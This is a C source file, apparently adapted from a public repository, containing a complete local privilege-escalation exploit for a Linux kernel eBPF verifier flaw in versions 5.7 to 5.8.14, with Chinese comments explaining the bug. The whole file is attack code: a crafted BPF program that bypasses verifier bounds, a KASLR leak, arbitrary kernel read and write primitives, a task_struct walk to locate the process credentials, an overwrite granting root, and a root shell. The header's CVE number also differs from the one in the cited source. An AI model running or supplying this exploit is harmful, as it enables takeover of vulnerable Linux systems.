// 修改自 https://github.com/xmzyshypnc/CVE-2020-27194/blob/main/root.c
// 參考: https://www.gushiciku.cn/pl/peOZ/zh-tw

// CVE-2020-27149
// 測試版本: 5.8.14 (自行編譯需要修改下面 arb_read 和 arb_write, 用他的 bzImage 就不用修改)
// 受害版本: 5.7 ~ 5.8.14

// 漏洞: scalar32_min_max_or() 將 64 位元的 umin_value 和 umax_value 直接餵給 dst_reg->s32_min_value 和 dst_reg->s32_max_value
//       https://elixir.bootlin.com/linux/v5.8.14/source/kernel/bpf/verifier.c#L5517
//
// POC: r5.umin_value = 1, r5.umax_value = 0x600000001, 呼叫 BPF_MOV32_REG(6, 5), 則 r6.s32_min_value == r6.s32_max_value == 1   => r6 在 32 位元情況下為 1
//      所以將它 >>1 則 verifier 會認定是 0, 由此 bypass verifier 的檢查
//
// 註:
// gef>b kernel/bpf/verifier.c:5365



#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include <sys/prctl.h>  
#include "linux/bpf.h"   
#include "bpf_insn.h"

#define LOG_BUF_SIZE 65535
#define RADIX_TREE_INTERNAL_NODE 2
#define RADIX_TREE_MAP_MASK 0x3f

#define BPF_MAP_GET(idx, dst)                                                        \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
    BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
    BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#define BPF_MAP_GET_ADDR(idx, dst)                                                   \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
    BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
    BPF_MOV64_REG((dst), BPF_REG_0)                   /* r_dst = (r0)   */

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
char* ctrlbuf; 
char* expbuf; 
char info[0x100];

char bpf_log_buf[LOG_BUF_SIZE];

static uint32_t arbitrary_read(uint64_t addr);
static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info);
static uint64_t read_8byte(uint64_t addr);

void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lx\n",num);              
}                                           

static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version);
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);

struct bpf_insn insns[] = {
    BPF_LD_MAP_FD(9,3),                         // r9 = ctrl_map_fd
    BPF_MAP_GET(0,5),                           // r5 = ctrl_map_fd[0]
    BPF_ALU64_IMM(BPF_MOV,0,1),                 // r0 = 1
    BPF_JMP32_IMM(BPF_JLE, 5, 0x7fffffff, 1),   // if r5 <= 0x7fffFFFF: jmp pc+1 => r5->max_val = 0x7fffFFFF
    BPF_EXIT_INSN(),                             
    BPF_JMP_IMM(BPF_JGT, 5, 0, 1),              // if r5 > 0: jmp pc+1           => r5->min_val = 1
    BPF_EXIT_INSN(),
    
    BPF_LD_IMM64(6, 0x600000002),               // r6 = 0x600000002
    BPF_JMP_REG(BPF_JLT, 5, 6, 1),              // if r5 < r6: jmp pc+1           => r5->max_val = 0x600000001
    BPF_EXIT_INSN(),

    BPF_ALU64_IMM(BPF_OR, 5, 0),                // r5 |= 0
    BPF_MOV32_REG(6, 5),                        // r6_32 = r5_32  => r6 = 1  (r5_32->min_val == r5_32->max_val == 1)
    BPF_ALU64_IMM(BPF_RSH, 6, 1),               // r6 >>= 1       => verifier: r6 = 0 , but actually 1 ~ 0xffffFFFF (因為 r5 可以是 1 ~ 0x600000001)
    BPF_ALU64_IMM(BPF_MUL,6,0x110),             // r6 *= 0x110

    BPF_LD_MAP_FD(9,4),                         // r9 = exp_map_fd
    BPF_MAP_GET_ADDR(0,7),                      // r7 = &exp_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_ALU64_REG(BPF_SUB,7,6),                 // r7 -= r6

    BPF_LD_MAP_FD(9,3),                         // r9 = ctrl_map_fd
    BPF_MAP_GET_ADDR(0,6),                      // r6 = ctrl_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_LDX_MEM(BPF_DW,0,7,0),                  // r0 = [r7+0]
    BPF_STX_MEM(BPF_DW,6,0,0x10),               // r6+0x10 = r0 = ctrl_map[2]
    BPF_LDX_MEM(BPF_DW,0,7,0xc0),               // r0 = [r7+0xc0]
    BPF_STX_MEM(BPF_DW,6,0,0x18),               // r6+0x18 = r0 = ctrl_map[3]
    BPF_ALU64_IMM(BPF_ADD,0,0x50),              // r0 += 0x50 => element_addr
    
                                                // ctrl_buf[1] -> 1:read 2:write
    BPF_LDX_MEM(BPF_DW,8,6,8),                  // r8 = [r6+8] = ctrl_map[1]
    BPF_JMP_IMM(BPF_JNE,8,0x1,6),

    //arb read
    BPF_LDX_MEM(BPF_DW,0,6,0x20),               // r0 = [r6+0x20] = ctrl_buf[4]
    BPF_STX_MEM(BPF_DW,7,0,0x40),               // *(r7+0x40) = r0
    BPF_ALU64_IMM(BPF_MOV,5,0x1234),            // test:r5 = 1
    BPF_ALU64_IMM(BPF_MUL,5,0x6),               // test:r5 = 1
    BPF_ALU64_IMM(BPF_MOV,0,0), 
    BPF_EXIT_INSN(),

    //arbwrite
    BPF_JMP_IMM(BPF_JNE,8,0x2,4),
    BPF_STX_MEM(BPF_DW,7,0,0),                   // [r7] = [ops] = r0 = element_addr
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK), // [ops+0x18] = BPF_MAP_TYPE_STACK
    BPF_ST_MEM(BPF_W,7,0x24,-1),                 // max_entries
    BPF_ST_MEM(BPF_W,7,0x2c,0),                  // locak_off

    //exit
    BPF_ALU64_IMM(BPF_MOV,0,0),
    BPF_EXIT_INSN(),
};

void prep() {
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    printf("ctrlmapfd: %d,  expmapfd: %d \n",ctrlmapfd,expmapfd);

    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns, sizeof(insns), "GPL", 0);  
    socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
    setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
}

void pwn(){
    uint32_t key = 0x0;
    ctrlbuf = malloc(0x100);
    expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++)
        expbuf64[i] = i+1;
    
    ctrlbuf64[0] = 2;
    ctrlbuf64[1] = 0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();

    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    bpf_lookup_elem(expmapfd,&key,expbuf);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    uint64_t kaslr = map_leak - 0xffffffff820488c0;
    uint64_t kernel_base = map_leak - 0x10488c0;
    loglx("map_leak", map_leak);
    loglx("elem_leak", elem_leak);
    loglx("kaslr",kaslr);
    loglx("kernel base => ",kernel_base);

    getchar();
    uint64_t init_pid_ns_str,init_pid_ns_ptr, start_search, addr;
    uint32_t read_low, read_high;
    uint64_t off = kernel_base - 0xffffffff81000000;
    init_pid_ns_str = 0xffffffff8248ea94 + off;
    printf("[+] --init_pid_ns_str addr : 0x%lx\n", init_pid_ns_str);
    init_pid_ns_ptr = 0xffffffff82660500 + off;
    printf("[+] --init_pid_ns_ptr addr : 0x%lx\n", init_pid_ns_ptr);
    char target[16];

    strcpy(target,"ama2in9");
    prctl(PR_SET_NAME,target); 
    init_pid_ns_ptr = 0xffffffff82660500 + off;
    uint32_t idr_base = arbitrary_read(init_pid_ns_ptr+0x18);
    printf("[+] idr_base addr: 0x%lx, value: 0x%x\n",(uint64_t)(init_pid_ns_ptr+0x18), idr_base);
    pid_t pid = getpid();
    printf("[+] pid = %d\n", pid);

    uint64_t index = pid - idr_base;
    printf("[+] index : 0x%lx\n",index);

    uint64_t root = init_pid_ns_ptr + 0x8; // &ns->idr &idr->idr_rt
    printf("[+] &ns->idr, &idr->idr_rt, root: 0x%lx\n",root);

    uint64_t xa_head = read_8byte(root + 0x8); // &root->xa_head 
    printf("[+] root->xa_head: 0x%lx\n", xa_head);
    uint64_t node = xa_head;
    //ok now
    while(1){
        uint64_t parent = node & (~RADIX_TREE_INTERNAL_NODE);
        printf("[+] -- parent: 0x%lx\n", parent);
        uint64_t shift = arbitrary_read(parent) & 0xff;
        uint64_t offset = (index >> shift) & RADIX_TREE_MAP_MASK;
        printf("[+] -- shift: 0x%lx, offset: 0x%lx\n",shift,  offset);
        node = read_8byte(parent + 0x28 + offset*0x8);
        printf("[+] -- node: 0x%lx\n", node);

        if(shift == 0){
            break;
        }
   }
    uint64_t first = read_8byte(node + 0x10); //*&pid->tasks[0] 
    printf("[+] first: 0x%lx\n", first);

    uint64_t task_struct = first - 0x940; // &(*(struct task_struct *)0)->pid_links[0] = 0x940
    uint64_t comm = read_8byte(task_struct + 0xa88);
    printf("[+] comm: %s\n", (char*)(&comm)); // get comm to check

    uint64_t cred = read_8byte(task_struct + 0xa78);// get cred addr 
    printf("[+] cred: 0x%lx\n", cred);
    getchar();
    uint64_t fake_map_ops[]={
        kaslr + 0xffffffff811f9d70,
        kaslr + 0xffffffff811fae80,
        0x0,
        kaslr + 0xffffffff811fa5e0,
        kaslr + 0xffffffff811f9e60, //get net key 5
        0x0,
        0x0,
        kaslr + 0xffffffff811dee60,
        0x0,
        kaslr + 0xffffffff811dec20,
        0x0,
        kaslr + 0xffffffff811f9f20,
        kaslr + 0xffffffff811fa4c0,
        kaslr + 0xffffffff811f9ea0,
        kaslr + 0xffffffff811f9e60, //map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811fa210,
        0x0,
        kaslr + 0xffffffff811fa030,
        kaslr + 0xffffffff811fac70,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811f9df0,
        kaslr + 0xffffffff811f9e20,
        kaslr + 0xffffffff811f9fc0,
        0,
    };
    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&key,expbuf,0);

    //overwrite fake ops
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x2;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();

    //overwrite the cred
    cred += 0x10;
    expbuf64[0] = 0x0-1;
    for(int i = 0; i < 8; i++){
        bpf_update_elem(expmapfd, &key, expbuf, cred+4+i*4);
    }
    return;
}


int main(int argc,char **argv){
    prep();
    pwn();
    system("/bin/sh");
    return 0;
}

static void writemsg(void) 
{
    char buffer[64];
    write(sockets[0], buffer, sizeof(buffer));
}


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}

static uint32_t arbitrary_read(uint64_t addr){
        uint32_t read_info;
        
        uint32_t key = 0x0;
        uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
        uint64_t *expbuf64  = (uint64_t *)expbuf;

        memset(ctrlbuf,'A',0x100);
        for(int i=0;i<0x2000/8;i++){
            expbuf64[i] = i+1;
        }
        
        ctrlbuf64[0] = 0x2;
        ctrlbuf64[1] = 1;
        ctrlbuf64[4] = addr - 0x58;

        bpf_update_elem(ctrlmapfd, &key, ctrlbuf64, 0);
        bpf_update_elem(expmapfd, &key, expbuf64, 0);
        writemsg();

        read_info =  bpf_map_get_info_by_fd(0, expbuf, expmapfd, info);
        return read_info;
}

static uint64_t read_8byte(uint64_t addr){

    uint32_t addr_low = arbitrary_read(addr);
    uint32_t addr_high = arbitrary_read(addr + 0x4);
    return ((uint64_t)addr_high << 32) | addr_low;
}

static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
{
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)&key,
        .value = (__u64)value,
        .info.bpf_fd = mapfd,
        .info.info_len = 0x100,
        .info.info = (__u64)info,
    };

    syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));

    return *(uint32_t *)((char *)info+0x40);
}


